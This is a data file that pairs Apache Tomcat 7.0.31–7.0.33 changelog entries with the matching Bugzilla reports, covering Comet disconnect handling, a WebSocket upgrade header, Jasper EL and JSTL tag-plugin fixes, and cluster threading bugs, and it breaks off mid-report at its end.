Coyote|Tomcat 7.0.33 (markt)|fix|54022|Ensure the Comet END event is triggered on client disconnect with APR/native on Windows Vista/2k8 or later. Patch provided by Douglas Beachy. (markt)|CometEvent.END event is not sent on a suspended socket disconnect when running with Tomcat Native (tcnative-1.dll) on Windows Vista / Windows Server 2008 or newer.|"Created attachment 29492 [details]
Tomcat 7.0.32 source file with the bugfix

Our Web application uses an asynchronous 3.0 servlet (via Atmosphere 1.0, actually) to send notification messages to clients connected via long-running sockets (e.g., HTTP streaming, long polling, etc.) I found a bug where Tomcat was not sending the CometEvent.END event on x64 platforms that used Tomcat Native when a socket would disconnect (e.g., by pressing CTRL-C from an HTTP GET curl command).  

After narrowing it down and debugging the Tomcat 7.0.32 source, I tracked the problem down to org.apache.coyote.AbstractProtocol.java.  Due to the way that APR handles socket polling in Tomcat Native, the bug only occurs on Windows platforms that 1) use tcnative-1.dll, and 2) are Vista/Server 2008 or newer.  Here is what is happening:

1) On startup, APR in tcnative-1.dll looks for a method named ""WSAPoll"" method in Ws2_32.dll.  If it finds it, it assigns that function as the function to use to poll sockets.  Otherwise, it falls back to the legacy method of polling sockets.  WSAPoll is only present on Windows Vista/Server 2008 or newer.

2) In org.apache.tomcat.util.net.AprEndpoint, the doPoll(long pollset) method invokes Poll.poll(pollset, pollTime, desc, true), which delegates the call to tcnative-1.dll if present.

3) If doPoll returns > 0, it means that at least one socket requires processing, so it falls through to this block in the doPoll method AprEndpoint.java (comments added below marked with ""{DB}""):

          for (int n = 0; n < rv; n++) {
              // Check for failed sockets and hand this socket off to a worker
              if (((desc[n*2] & Poll.APR_POLLHUP) == Poll.APR_POLLHUP)   // {DB} only the WSAPoll method sets the APR_POLLHUP flag when a socket disconnects; neither the legacy tcnative polling method nor the pure Java Coyote polling method sets this flag (which is fine)
                      || ((desc[n*2] & Poll.APR_POLLERR) == Poll.APR_POLLERR)
                      || (comet && (!processSocket(desc[n*2+1], SocketStatus.OPEN)))  // {DB} this line is executed for comet sockets if WSAPoll is not available on this platform (e.g., pre-Vista/Server 2008) or if tcnative-1.dll is not present.  (This is also fine.)
                      || (!comet && (!processSocket(desc[n*2+1])))) {
                  // Close socket and clear pool
                  if (comet) {
                      processSocket(desc[n*2+1], SocketStatus.DISCONNECT);  // {DB} this is only reached if tcnative-1.dll is present and we are running on Vista/Server 2008 or newer.  This is OK, but there is a bug with SocketStatus.DISCONNECT handling for comet sockets in processSocket (described in the next step)
                  } else {
                      destroySocket(desc[n*2+1]);
                  }
              }
          }

 4) The processSocket(long socket, SocketStatus status) method fires up a SocketEventProcessor and runs it, which excutes this:
 
        Handler.SocketState state = handler.process(socket, status);  // {DB} this does not send CometEvent.END for comet if status == SocketStatus.DISCONNECT (details in next steps)
        if (state == Handler.SocketState.CLOSED) {
            // Close socket and pool
            destroySocket(socket.getSocket().longValue());  // {DB} this closes the socket and frees it for reuse, but since the Comet application was not notified that the socket went away, the next time it tries to send data down the socket it either crashes the JVM or writes the data to the response which is now owned by somebody else.  Chaos ensues.
            socket = null;
        }

  5) When running Tomcat Native, the handler.process(socket, status) method is implemented by org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler, which extends AbstractConnectionHandler defined as an inner class in org.apache.coyote.AbstractProtocol.  The method and the fix that I made on my test instance are shown below [the fix was to add '&& (!processor.isComet())' to the beginning condition of the 'if' block]:
======  
      public SocketState process(SocketWrapper<S> socket, SocketStatus status) {
          ...<snip>...
          do {
              // {DB} NOTE: status only == SocketStatus.DISCONNECT here if we are running tcnative on Windows Vista / Server 2008 or newer
              // {DB}       For all other cases status == SocketStatus.OPEN here even if a disconnect has occurred, so it falls through to the '} else if (processor.isComet()) {' line all is well.
              
              // {DB} Original line: if (status == SocketStatus.DISCONNECT) {
              if ( (status == SocketStatus.DISCONNECT) && (!processor.isComet()) ) {  // <<<<<< {DB} BUGFIX: if comet, must allow processor.event(SocketStatus.DISCONNECT) later in the 'if' block to send the Comet.END event and return SocketState.CLOSED
                  //do nothing here, just wait for it to get recycled
              } else if (processor.isAsync() || state == SocketState.ASYNC_END) {
                  state = processor.asyncDispatch(status);
              } else if (processor.isComet()) {
                  state = processor.event(status);  // {DB} this sends CometEvent.END and returns SocketState.CLOSED if status == SocketStatus.DISCONNECT, which is what we want
              } else if (processor.isUpgrade()) {
                  state = processor.upgradeDispatch();
              } else {
                  state = processor.process(socket);
              }
          ...<snip>...
======

After I made the fix above and deployed the updated tomcat-coyote.jar I am now getting the CometEvent.END events as expected when using Tomcat Native on Windows 7.  We are using Atmosphere (which uses Comet) for our next release, but we will need this Tomcat bugfix before we can deploy.  We could ship a custom patched tomcat-coyote.jar but obviously we would prefer to have an official fix in the next Tomcat patch release so we could just deploy that.  

The fix I made above works for me, but if you need to reproduce the problem, all you need to do is:
  1) Install Tomcat 7.0.32 along with Tomcat Native on a Windows 7 or Windows Server 2008 PC (I was using a 64-bit Windows 7 PC).
  2) Run a servlet that:  
      a) implements org.apache.catalina.comet.CometProcessor, and 
      b) logs the CometEvents received, and 
      c) suspends the HttpRequest when it receives one.
  3) Connect to that servlet by doing an HTTP GET via Curl.
  4) Press CTRL-C to abort the socket connection.  The CometEvent.END event is never fired.
  
I attached the source file containing the bugfix (AbstractProtocol.java).  The fix is marked with ""{DB}"" comments.  Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54022
Coyote|Tomcat 7.0.33 (markt)|fix|54067|Ensure responses with 1xx response codes are correctly marked as not containing an entity body. This caused an issue for some WebSocket clients when an Transfer-Encoding header was sent with the 101 (HTTP upgrade) response. (markt)|Upgrade Response with Transfer-Encoding: chunked invalid|"WebSocket upgrade response from Tomcat 7.0.32 contains an invalid response header ""Transfer-Encoding: chunked""

Full Request/Response is as follows (against example URI ws://localhost:8080/examples/websocket/echoMessage from distribution) ...

GET /examples/websocket/echoMessage HTTP/1.1
Host: localhost:8080
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ZDTIRU5vU9xOfkg8JAgN3A==
Sec-WebSocket-Version: 13

HTTP/1.1 101 Switching Protocols
Server: Apache-Coyote/1.1
Upgrade: websocket
Connection: upgrade
Sec-WebSocket-Accept: Kgo85/8KVE8YPONSeyhgL3GwqhI=
Transfer-Encoding: chunked
Date: Mon, 29 Oct 2012 16:32:53 GMT


The Jetty project is working this issue from the Jetty WebSocket client point of view.
https://bugs.eclipse.org/bugs/show_bug.cgi?id=393075"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54067
Jasper|Tomcat 7.0.33 (markt)|code|53867|Optimise the XML escaping provided by the PageContext implementation. Based on a patch by Sheldon Shao. (markt)|Performance tuning solution for PageContextImpl.XmlEscape|"Created attachment 29369 [details]
Patch for PageContextImpl.java

XmlEscape is used to do escape special characters for EL result.
 Currently it gets characters from String one by one and check whether the char is special character or not, than put the char into a StringBuilder.

Most cases the string has no such special characters, However, it always creates a new StringBuilder than do such iteration.

It's better to check whether there is any special characters first.
 If there is special character, then do create a StringBuilder and put those characters in front of te special character into the StringBuilder. 
Again, check the string by character one by one similar as the original logic.



Here is the result of comparison testing between the two methods.

Old escape:1610
New escape:1050
Old escape:1566
New escape:873
Old escape:1437
New escape:905
Old escape:1590
New escape:890
Old escape:1452
New escape:889
Old escape:1547
New escape:889
Old escape:1467
New escape:889
Old escape:1575
New escape:930
Old escape:1479
New escape:874
Old escape:1517
New escape:970"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53867
Jasper|Tomcat 7.0.33 (markt)|code|53896|Use an optimised CompositeELResolver for Jasper that skips resolvers that are known to be unable to resolve the value. Patch by Jarek Gawor. (markt)|Optimized Jasper ELResolver|JspApplicationContextImpl sets up a CompositeELResolver with the standard and application-specific EL resolvers. The CompositeELResolver implementation basically just invokes every ELResolver in the list until a value is successfully resolved. The issue is that in certain situations some ELResolvers are called needlessly. For example, if base != null, calling getValue() on ImplicitObjectELResolver is unnecessary. So there are cases in which certain ELResolvers can be skipped over. In EL heavy applications skipping over certain ELResolvers can quickly add up.|https://bz.apache.org/bugzilla/show_bug.cgi?id=53896
Jasper|Tomcat 7.0.33 (markt)|fix|53986|Correct a regression introduced by the fix for 53713. JSP comments that ended with the sequence ---%> (or any similar sequence with a odd number of - characters) was not correctly parsed. (markt)|Comment end tag preceded directly by a dash causes JSP fail compilation|"Created attachment 29466 [details]
JSP file to reproduce compilation error

I have a JSP file that contained a comment line as follows:
<%--- comment ---%>

Such a JSP compiles in Tomcat 7.0.30, but it does not compile in 7.0.32.  I‚Äôve attached a copy of a test file, which compiles in 7.0.30, but not in 7.0.32.  The only related change I see in the release notes is https://issues.apache.org/bugzilla/show_bug.cgi?id=53713.  

From reading the JSP 2.2 spec, it appears that absent a specific comment about whitespace, the rules of XML shall apply, which effectively means whitespace is ignored.  This would seem to indicate this could be a regression introduced in 7.0.32, but since the spec is somewhat vague in the section about comments, 

ERROR 09 Oct 2012 11:15:25,190 [http-bio-8080-exec-8] [com.liferay.portal.log.Co
mmonsLogImpl.error(52)] org.apache.jasper.JasperException: /html/portal/layout/v
iew/portlet.jsp (line: 48, column: 6) Unterminated &lt;%-- tag
        at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorH
andler.java:42)
        at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.j
ava:408)
        at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.j
ava:133)
        at org.apache.jasper.compiler.Parser.parseComment(Parser.java:615)
        at org.apache.jasper.compiler.Parser.parseElements(Parser.java:1425)
        at org.apache.jasper.compiler.Parser.parse(Parser.java:138)
        at org.apache.jasper.compiler.ParserController.doParse(ParserController.
java:242)
        at org.apache.jasper.compiler.ParserController.parse(ParserController.ja
va:102)
        at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:198)
        at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
        at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
        at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
        at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext
.java:646)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper
.java:357)
        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:3
90)
        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(Appl
icationFilterChain.java:305)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationF
ilterChain.java:210)
        at com.liferay.filters.strip.StripFilter.doFilter(StripFilter.java:260)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53986
Jasper|Tomcat 7.0.33 (markt)|fix|54011|Fix a bug in the tag plug-in for <c:out> that triggered a JSP compilation error if the escapeXml attribute was used. Patch provided by Sheldon Shao. (markt)|"Code generation error in jstl tagPlugin ""Out"" when has ""escapeXml"" on the tagPlugin"|"Created attachment 29482 [details]
Patch for org.apache.jasper.tagplugins.jstl.core.Out.java

When setting up org.apache.jasper.tagplugins.jstl.core.Out as a tagplugin and trying to make code generation for the following code, 

<c:out escapeXml=""false"" value=""test""/>

It will generate an error.


It has a typo in it 

if(hasEscapeXml){
   ctxt.generateJavaSource(strEscapeXmlName + "" = Boolean.parseBoolean(("");
   ctxt.generateAttribute(""default"");
   ctxt.generateJavaSource("").toString());"");
}

The attribute name should be ""escapeXml"".
Even change the right name,  it occurs an error because of ""(false).toString()"".

Attached two patchs for this bug fix and code simplified."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54011
Jasper|Tomcat 7.0.33 (markt)|code||Follow up to 54011. Simplify generated code for <c:out>. Based on a patch by Sheldon Shao. (markt)|"Code generation error in jstl tagPlugin ""Out"" when has ""escapeXml"" on the tagPlugin"|"Created attachment 29482 [details]
Patch for org.apache.jasper.tagplugins.jstl.core.Out.java

When setting up org.apache.jasper.tagplugins.jstl.core.Out as a tagplugin and trying to make code generation for the following code, 

<c:out escapeXml=""false"" value=""test""/>

It will generate an error.


It has a typo in it 

if(hasEscapeXml){
   ctxt.generateJavaSource(strEscapeXmlName + "" = Boolean.parseBoolean(("");
   ctxt.generateAttribute(""default"");
   ctxt.generateJavaSource("").toString());"");
}

The attribute name should be ""escapeXml"".
Even change the right name,  it occurs an error because of ""(false).toString()"".

Attached two patchs for this bug fix and code simplified."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54011
Jasper|Tomcat 7.0.33 (markt)|fix|54012|Fix a bug in the tag plug-in infrastructure that meant the <c:set> triggered a JSP compilation error when used in a tag file. Based on a patch provided by Sheldon Shao. (markt)|"No ""pageContext"" in tag files' generated java code when using code generation by JSTL tagplugin ""Set"""|"Created attachment 29485 [details]
Patch for org.apache.jasper.tagplugins.jstl.core.Set.java

The code generated by the following code from "" org.apache.jasper.tagplugins.jstl.core.Set"" can't work in Tag Files.

There is no ""PageContext"" in tag file. So this should check ""isTagFile"".

            String strVar = ctxt.getConstantAttribute(""var"");
            ctxt.generateJavaSource(""if(null != "" + resultName + ""){"");
            ctxt.generateJavaSource(""    pageContext.setAttribute(\"""" + strVar + ""\"","" + resultName + "","" + iScope + "");"");
            ctxt.generateJavaSource(""} else {"");
            if(hasScope){
                ctxt.generateJavaSource(""    pageContext.removeAttribute(\"""" + strVar + ""\"","" + iScope + "");"");
            }else{
                ctxt.generateJavaSource(""    pageContext.removeAttribute(\"""" + strVar + ""\"");"");
            }
            ctxt.generateJavaSource(""}"");"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54012
Jasper|Tomcat 7.0.33 (markt)|code|54017|Simplify coercion of String instances to Object. (markt)|new String instance is generated for constant string in Generator.convertString|"If the target class is ""Object.class"", the generator generates
        ""new String("" + quoted + "")"";
as attribute value for Tag Handler.

How about using quoted directly same as when the target class is ""Object.class""?

Creating a String instance will cause some overhead from memory allocation and hash code recaluation when it is used as a key on HashMap.


Here is the detail code,

        /*
         * @param c The target class to which to coerce the given string @param
         * s The string value @param attrName The name of the attribute whose
         * value is being supplied @param propEditorClass The property editor
         * for the given attribute @param isNamedAttribute true if the given
         * attribute is a named attribute (that is, specified using the
         * jsp:attribute standard action), and false otherwise
         */
        private String convertString(Class<?> c, String s, String attrName,
                Class<?> propEditorClass, boolean isNamedAttribute) {

            String quoted = s;
            if (!isNamedAttribute) {
                quoted = quote(s);
            }

            if (propEditorClass != null) {
                String className = c.getCanonicalName();
                return ""(""
                        + className
                        + "")org.apache.jasper.runtime.JspRuntimeLibrary.getValueFromBeanInfoPropertyEditor(""
                        + className + "".class, \"""" + attrName + ""\"", "" + quoted
                        + "", "" + propEditorClass.getCanonicalName() + "".class)"";
            } else if (c == String.class) {
                return quoted;
            } else if (c == boolean.class) {
                return JspUtil.coerceToPrimitiveBoolean(s, isNamedAttribute);
            } else if (c == Boolean.class) {
                return JspUtil.coerceToBoolean(s, isNamedAttribute);
            } else if (c == byte.class) {
                return JspUtil.coerceToPrimitiveByte(s, isNamedAttribute);
            } else if (c == Byte.class) {
                return JspUtil.coerceToByte(s, isNamedAttribute);
            } else if (c == char.class) {
                return JspUtil.coerceToChar(s, isNamedAttribute);
            } else if (c == Character.class) {
                return JspUtil.coerceToCharacter(s, isNamedAttribute);
            } else if (c == double.class) {
                return JspUtil.coerceToPrimitiveDouble(s, isNamedAttribute);
            } else if (c == Double.class) {
                return JspUtil.coerceToDouble(s, isNamedAttribute);
            } else if (c == float.class) {
                return JspUtil.coerceToPrimitiveFloat(s, isNamedAttribute);
            } else if (c == Float.class) {
                return JspUtil.coerceToFloat(s, isNamedAttribute);
            } else if (c == int.class) {
                return JspUtil.coerceToInt(s, isNamedAttribute);
            } else if (c == Integer.class) {
                return JspUtil.coerceToInteger(s, isNamedAttribute);
            } else if (c == short.class) {
                return JspUtil.coerceToPrimitiveShort(s, isNamedAttribute);
            } else if (c == Short.class) {
                return JspUtil.coerceToShort(s, isNamedAttribute);
            } else if (c == long.class) {
                return JspUtil.coerceToPrimitiveLong(s, isNamedAttribute);
            } else if (c == Long.class) {
                return JspUtil.coerceToLong(s, isNamedAttribute);
            } else if (c == Object.class) {
                return ""new String("" + quoted + "")"";
            } else {
                String className = c.getCanonicalName();
                return ""(""
                        + className
                        + "")org.apache.jasper.runtime.JspRuntimeLibrary.getValueFromPropertyEditorManager(""
                        + className + "".class, \"""" + attrName + ""\"", "" + quoted
                        + "")"";
            }
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54017
Jasper|Tomcat 7.0.33 (markt)|fix|54144|Fix a bug in the tag plug-in for <c:out> that meant that if the value of the tag evaluated to a java.io.Reader object then it was not correctly handled. (markt)|"Processing of java.io.Reader in ""Out"" tagplugin"|"Reviewing r1401816 I see two issues in tagplugin o.a.jasper.tagplugins.jstl.core.Out:

The code that the plugin generates calls value.toString(), default.toString() and passes these String values to the static method Out.output(...). This new method was added in r1401816.

I think the output() method should accept Objects instead of Strings, because the following is wrong:

1. The evaluation of default.toString() is not needed at all if the default is not used.

2. The JSTL spec (1.1, 1.2) says that there is special processing if value is java.io.Reader. There is no such processing in the current code. (It seems that this feature was added in JSTL 1.1).

[quote]
If the result of the evaluation is not a java.io.Reader object, then it is coerced to
a String and is subsequently emitted into the current JspWriter object.

If the result of the evaluation is a java.io.Reader object, data is first read from the
Reader object and then written into the current JspWriter object.
[/quote]

These two issues are not new - they existed before the recent changes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54144
Cluster|Tomcat 7.0.33 (markt)|fix||Add getSessionIdsFull operation to mbeans-descriptor. listSessionIdsFull no longer exist. (kfujino)|||
Cluster|Tomcat 7.0.33 (markt)|fix|54086|Fix threading issue when stopping an NioReceiver. (markt)|ConcurrentModificationException in NioReceiver on shutdown|"Solaris 10 x86, jdk 1.7.

We use tomcat clustering for session replication with 4 nodes and sometimes 8 nodes.  We get a ConcurrentModificationException occasionally on shutdown.  I have been unable to reliably reproduce the exception. In the log, I see ""Unable to close cluster receiver selector."" with the exception below:

java.util.ConcurrentModificationException 
    java.util.HashMap$HashIterator.nextEntry(HashMap.java:894) 
    java.util.HashMap$KeyIterator.next(HashMap.java:928) 
    java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1067) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãtransport.‚Äãnio.‚ÄãNioReceiver.‚ÄãcloseSelector(‚ÄãNioReceiver.‚Äãjava:382) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãtransport.‚Äãnio.‚ÄãNioReceiver.‚ÄãstopListening(‚ÄãNioReceiver.‚Äãjava:365) 
    org.apache.catalina.tribes.transport.nio.NioReceiver.stop(NioReceiver.java:86) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelCoordinator.‚ÄãinternalStop(‚ÄãChannelCoordinator.java:203) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelCoordinator.‚Äãstop(‚ÄãChannelCoordinator.‚Äãjava:115) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚Äãinterceptors.‚ÄãMessageDispatchInterceptor.‚Äãstop(‚ÄãMessageDispatchInterceptor.java:172)
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.‚Äãapache.‚Äãcatalina.‚Äãtribes.‚Äãgroup.‚ÄãChannelInterceptorBase.‚Äãstop(‚ÄãChannelInterceptorBase.java:178) 
    org.apache.catalina.tribes.group.GroupChannel.stop(GroupChannel.java:438) 
    org.‚Äãapache.‚Äãcatalina.‚Äãha.‚Äãtcp.‚ÄãSimpleTcpCluster.‚ÄãstopInternal(‚ÄãSimpleTcpCluster.‚Äãjava:‚Äã744) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1199) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.StandardService.stopInternal(StandardService.java:502) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:753) 
    org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232) 
    org.apache.catalina.startup.Catalina.stop(Catalina.java:751) 
    org.apache.catalina.startup.Catalina.start(Catalina.java:713) 
    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) 
    sun.‚Äãreflect.‚ÄãDelegatingMethodAccessorImpl.‚Äãinvoke(‚ÄãDelegatingMethodAccessorImpl.‚Äãjava:43) 
    java.lang.reflect.Method.invoke(Method.java:601) 
    org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322) 
    org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:451)

I looked at the code briefly and noticed the use of a SelectionKey Iterator.  I have not dug deep enough to find any issue in the NioReceiver code, but I did find this potentially relevant text in the Selector javadocs (http://docs.oracle.com/javase/7/docs/api/java/nio/channels/Selector.html):

""A selector's key and selected-key sets are not, in general, safe for use by multiple concurrent threads. If such a thread might modify one of these sets directly then access should be controlled by synchronizing on the set itself. The iterators returned by these sets' iterator methods are fail-fast: If the set is modified after the iterator is created, in any way except by invoking the iterator's own remove method, then a ConcurrentModificationException will be thrown."""|https://bz.apache.org/bugzilla/show_bug.cgi?id=54086
Web applications|Tomcat 7.0.33 (markt)|add|54143|Add display of the memory pools usage (including PermGen) to the Status page of the Manager web application. (kkolinko)|Add display of PermGen memory pool usage to the Status page of the Manager webapp|"It would be nice to add display of the PermGen memory pool usage to the Status page of the Manager webapp.

This is because OutOfMemoryError's caused by PermGen pool exhaustion are fatal for the server and are hard to predict, as they are are not visible from the simple Free/Max/Total Heap statistics.

Technically speaking, the information is provided by ""MemoryPool"" MBeans. It is easier to display all memory pools at once rather than to search for specific one.

The beans could be obtained via a query, e.g. [1], but it is much easier to use standard API that is available in Java SE [2].

[1] http://localhost:8080/manager/jmxproxy/?qry=java.lang%3Atype%3DMemoryPool%2C*
[2] http://docs.oracle.com/javase/6/docs/api/java/lang/management/MemoryPoolMXBean.html

I have an implementation ready and will commit it shortly.

A small question is whether it is suitable for the simple ""Server Status"" page or is better for the ""Complete Server Status"" one. I think it is OK on the simple page, as this information is important."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54143
Tribes|Tomcat 7.0.33 (markt)|fix|54045|Make sure getMembers() returns available member when TcpFailureDetector works in static cluster. (kfujino)|ReplicatedMap don't like TcpFailureDetector in static configuration|"Tribes stack using:
* TcpPingInterceptor
* TcpFailureDetector
* MessageDispatchInterceptor
* StaticMembershipInterceptor
Do not work well in static cluster.

First side (ie one thread):
* call to TcpFailureDetector.heartbeat()
* call to checkMembers(false)
* call to performBasicCheck() in synchronized(membership)
* in performBasicCheck, for a missing static node:
*   add ""missing"" member to membership with membership.memberAlive(m)
*       HERE THE SECOND THREAD HAVE SOME TIME TO WORK
*   check it with memberAlive(m)
*   remove it since if it doesn't exist

Second side (ie another thread):
* some call to channel.getMembers() like what the done by AbstractReplicatedMap
* this call will call the TcpFailureDetector.getMembers()
* this one could return a wrong value since it can contains unavailable nodes

Note:
* synchronize on membership isn't use by TcpFailureDetector in getMember(), getMembers(), hasMembers(), neither in Membership equivalent method (maybe because it's too heavy to lock every thread while the TcpFailureDetector check if node are alive).

It must not be an issue for AbstractReplicatedMap since with or without TcpFailureDetector a node could disapear while replicated map try to use it.
But ReplicatedMap use always Channel.SEND_OPTIONS_DEFAULT where the value is Channel.SEND_OPTIONS_USE_ACK. So a message sent to a missing node will fail with an exception.

Personnaly I override TcpFailureDetector.heartbeat() to avoid performBasicCheck() if I use a static configuration (TcpPingInterceptor call performForcedCheck()).
But this doesn't fix ReplicatedMap issue.

Better fix could avoid adding missing member to membership list:
* Add a method like memberAlive(MemberImpl) to Membership without side effect (add the member)
* in TcpFailureDetector.performBasicCheck(): check this new method before adding the node


This doesn't fix the AbstractReplicatedMap issue which work always with acknoledge from other nodes.


Same code for Tomcat 6.


best regards
F.Arnoud"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54045
Catalina|Tomcat 7.0.32 (markt)|fix||Revert multiple operation support for the JMXProxyServlet pending further discussion. (schultz)|||
Catalina|Tomcat 7.0.32 (markt)|fix||CVE-2012-4431: Fix bypass of CsrfPreventionFilter when there is no session. Improve session management in the filter. (kkolinko)|||
Web applications|Tomcat 7.0.32 (markt)|fix||Correct the couple of broken links in the Tomcat Javadoc. (markt)|||
Other|Tomcat 7.0.32 (markt)|update||Update optional Checkstyle library to 5.6. (kkolinko)|||
Catalina|Tomcat 7.0.31 (markt)|update||Add one library from JDK 7 to the value of jarsToSkip property in the catalina.properties file. (kkolinko)|||
Catalina|Tomcat 7.0.31 (markt)|add|52777|Add an option to automatically remove old, unused versions (ones where there are no longer any active sessions) of applications deployed using parallel deployment. (markt)|Automatically shut down old versions in parallel deployment|"Under parallel deployment, when an older version in an application has zero sessions, shut it down automatically to release tomcat and JVM resources.

Christopher Schultz suggested these approaches might be possible (on the Tomcat user list):

1. Modify the parallel deployment code to register an MBean
NotificationListener that filters for useful events (such as expiring
session notifications on the outgoing webapp).

2. When the listener receives a notification, check the current state
(e.g. session count=0; or, I suppose you could make this a part of
your filter in step #1). If session count = 0, start a new thread that
stops the outgoing webapp and de-registers the listener.

Or.

1. Install a SessionEventListener that counts-down the sessions
(you'll have to get the count from JMX, I suppose) until they equal 0,
then starts a new thread that ... etc.

Or.

1. Install a Timer thread that polls at intervals (1 minute?) to see
if all the sessions are dead and then starts a thread ... etc.

The first idea seems the cleanest, though Tomcat might not actually
fire MBean events for things like session count changing."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52777
Catalina|Tomcat 7.0.31 (markt)|fix|53828|Use correct status code when closing a WebSocket connection normally in response to a close frame from a client. (markt)|StreamInbound.closeOutboundConnection(WsFrame) closes with an opcode instead of status|"201	private void closeOutboundConnection(WsFrame frame) throws IOException {
202	  try {
203	    getWsOutbound().close(frame);
204	  } finally {
205	    doOnClose(Constants.OPCODE_CLOSE);
206	  }
207	}

Line 205 uses the close opcode instead of a valid status (Constants.STATUS_*).

Not sure of the exact context of this called but it seems to only be called when the last frame from the client was a close frame, thus a Constants.STATUS_NORMAL may be in order.

If not, the frame's opcode could be inspected and mapped to an appropriate status (normal, shutdown, etc...).

Thanks,
Michael"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53828
Catalina|Tomcat 7.0.31 (markt)|update||JMXProxyServlet now allows multiple operation commands like invokeAndSet, invokeAndGet, etc. (schultz) Note: reverted in 7.0.32.|||
Catalina|Tomcat 7.0.31 (markt)|fix|53843|request.isAsyncStarted() must continue to return true until the dispatch actually happens (which at the earliest isn't until the thread where startAsync() was called returns to the container). (markt)|isAsyncStarted may return false in thread that started async processing|"After async processing starts in some container thread A, subsequent calls to request.isAsyncStarted() return true as expected.

However as soon as an application thread B calls asyncContext.dispatch(), isAsyncStarted() begins to return false even if the actual dispatch has not yet occurred. For this case the spec says: ""the dispatch operation will be delayed until after the container-initiated dispatch has returned to the container.""

For the brief period after dispatch() is called but before the actual dispatch begins (and DispatcherType becomes ASYNC), isAsyncStarted should return true. Without that, the return value of isAsyncStarted() may suddenly change while thread A is still exiting causing it to not recognize that async processing started and that it needs to exit as quickly as possible."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53843
Catalina|Tomcat 7.0.31 (markt)|fix|53863|Ensure that the implicit servlets (JSP and default) are marked as override-able when using embedded mode. (markt)|Unable to override default servlet when using Tomcat in embedded mode|"An implementation of ServletContainerInitializer can't add a mapping to ""/"" because the default servlet is loaded first, as first reported in 51278:

public final class SampleServletContainerInitializer implements ServletContainerInitializer {

  public void onStartup(final Set<Class<?>> c, final ServletContext ctx) throws ServletException {
    final XmlWebApplicationContext appCtx = new XmlWebApplicationContext();

    appCtx.setConfigLocation(""/WEB-INF/DispatcherServlet-servlet.xml"");

    final ServletRegistration.Dynamic dispatcher = ctx.addServlet(""DispatcherServlet"", new DispatcherServlet(appCtx));

    dispatcher.setLoadOnStartup(1);

    final Set<String> conflictSet = dispatcher.addMapping(""/"");

    for (final String conflict : conflictSet)
      out.println(conflict); // prints ""/""

  }

}

A test case follows attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53863
Catalina|Tomcat 7.0.31 (markt)|fix||When the DefaultServlet is under heavy load, the HTTP header parser added to address 52811 generates large amounts of garbage and uses significant CPU time. A cache has been added that significantly reduces the overhead of this parser. (markt)|HttpServletResponse.setContentType() parses the content type incorrectly|"When creating the HttpServletResponse the setContentType(type) is used for setting the content type and character encoding.
If the type is for example:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

it is parsed and the content type is set to:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil

and character encoding to:

UTF-8

I believe it is incorrect, the content type should be:

